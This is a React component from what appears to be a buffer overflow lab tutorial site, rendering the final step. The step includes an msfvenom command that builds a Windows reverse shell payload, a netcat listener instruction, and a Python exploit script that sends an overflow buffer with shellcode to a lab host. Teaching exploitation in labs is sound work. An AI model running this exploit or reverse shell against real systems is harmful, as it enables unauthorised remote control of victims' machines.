import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const BufferOverflowStep11 = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography>
              Run the following msfvenom command and update the `-b` option with
              all the bad characters identified eariler.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                'msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\\x00" -f c'
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography>
              Change the payload variable in 5-final.py to the output of the
              command.
            </Typography>
            <Image src="/Step11.png" width={527} height={417} />
            <Box sx={{ m: 4 }} />
            <Typography>
              Since an encoder was likely used to generate the payload, you will
              need some space in memory for the payload to unpack itself. You
              can do this by setting the padding variable to a string of 16 or
              more "No Operation" (\x90) bytes:
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {'padding = "\\x90" * 16'}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography>
              Lastly, start a netcat listener on thee port specified in the
              msfvenom payload and run the 5-exploit.py script to get a reverse
              shell.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography>5-final.py</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"import socket\n\n" +
                'ip = "10.10.189.218"\n' +
                "port = 1337\n\n" +
                'prefix = "OVERFLOW1 "\n\n' +
                "offset = 1978\n" +
                'overflow = "A" * offset\n' +
                'retn = "\\xaf\\x11\\x50\\x62"\n' +
                'padding = "x90" * 16\n' +
                'payload = "\\xfc\\xbb\\x7c\\x0d\\xca\\xa3\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3.........."\n' +
                'postfix = ""\n\n' +
                "buffer = prefix + overflow + retn + padding + payload + postfix\n\n" +
                "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n" +
                "try:\n" +
                "  s.connect((ip, port))\n" +
                '  print("Sending evil buffer...")\n' +
                '  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n' +
                '  print("Done!")\n' +
                "except:\n" +
                '  print("Could not connect.")'}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default BufferOverflowStep11;
